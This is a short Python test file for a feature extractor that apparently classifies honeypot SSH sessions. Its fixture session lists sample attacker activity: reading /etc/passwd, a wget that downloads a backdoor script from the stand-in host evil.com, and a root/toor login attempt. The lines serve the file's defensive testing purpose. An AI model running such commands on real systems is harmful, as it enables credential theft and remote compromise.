"""Test Chrollo Classifier"""
import pytest
from protocols.p3chrollo.feature_extractor import ChrolloFeatureExtractor

def test_feature_extraction():
    session = {
        "session_id": "test1",
        "srcip": "192.168.1.100",
        "commands": ["ls", "cat /etc/passwd", "wget http://evil.com/backdoor.sh"],
        "auth_attempts": [{"username": "root", "password": "toor", "success": False}],
        "files": ["/etc/passwd"],
        "network_events": ["cowrie.session.connect"],
        "start_time": "2024-01-01T00:00:00.000000",
        "last_time": "2024-01-01T00:05:00.000000"
    }
    extractor = ChrolloFeatureExtractor()
    features = extractor.extract(session)
    assert len(features) == 150
    assert features.dtype.name == "float32"
